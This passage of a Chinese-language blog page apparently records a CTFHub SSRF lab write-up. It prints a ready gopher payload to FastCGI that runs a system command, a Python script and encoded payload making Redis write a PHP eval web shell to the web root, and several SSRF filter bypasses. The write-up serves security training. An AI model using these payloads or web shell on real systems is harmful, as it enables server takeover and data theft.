+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" width="1920" height="50" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-220.png" alt="" class="wp-image-3192" /> </figure></p>
+<p>利用工具构造<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1143" height="522" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-221.png" alt="" class="wp-image-3194" /> </figure></p>
+<p>再进行一次url加密，得到最后的payload。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%251BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%250D%2501DOCUMENT_ROOT/%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520/flag_3459efb73be0b89b105d41e2f96c6d2c%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x07-redis协议">0x07 Redis协议</h2>
+<p>题目：这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!</p>
+<p>参考<a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener noreffer ">https://xz.aliyun.com/t/5665</a></a></p>
+<pre class="wp-block-code"><code>import urllib
+protocol="gopher://"
+ip="127.0.0.1"
+port="6379"
+shell="\n\n&lt;?php eval($_GET&#91;\"cmd\"]);?&gt;\n\n"
+filename="shell.php"
+path="/var/www/html"
+passwd=""
+cmd=&#91;"flushall",
+     "set 1 {}".format(shell.replace(" ","${IFS}")),
+     "config set dir {}".format(path),
+     "config set dbfilename {}".format(filename),
+     "save"
+     ]
+if passwd:
+    cmd.insert(0,"AUTH {}".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
+    cmd+=CRLF
+    return cmd
+
+if __name__=="__main__":
+    for x in cmd:
+        payload += urllib.parse.quote(redis_format(x))
+    print (payload)</code></pre>
+<p>再经过url编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行<code>url/shell.php?cmd=system('find / -name flag*');</code>，找到可疑文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1836" height="78" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-222.png" alt="" class="wp-image-3198" /> </figure></p>
+<p>cat一下就出来flag了。</p>
+<h2 id="0x08-url-bypass">0x08 URL Bypass</h2>
+<p>题目：请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</p>
+<p>构造<code>url?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></p>
+<h2 id="0x09-数字ip-bypass">0x09 数字IP Bypass</h2>
+<p>题目：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p>
+<p>转换成16进制，构造<code>url?url=0x7f000001/flag.php</code></p>
+<h2 id="0x0a-302跳转-bypass">0x0A 302跳转 Bypass</h2>
+<p>题目：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p>
+<p>先直接构造<code>url?url=127.0.0.1/flag.php</code>访问<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="217" height="26" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-216.png" alt="" class="wp-image-3177" /> </figure></p>
+<p>改成localhost，成功。</p>
+<h2 id="0x0b-dns重绑定-bypass">0x0B DNS重绑定 Bypass</h2>
+<p>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p>
+<p>提供了一个附件：<a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noopener noreffer ">https://zhuanlan.zhihu.com/p/89426041</a></a></p>
+<p>答案参考附件就出来了。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-04-11</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-SSRF学习" data-hashtags="Web安全,CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-SSRF学习"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-SSRF学习"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-SSRF学习"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="prev" rel="prev" title="安全牛反序列化学习笔记"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>安全牛反序列化学习笔记</a>
+            <a href="/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="next" rel="next" title="安全牛XXE学习笔记">安全牛XXE学习笔记<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
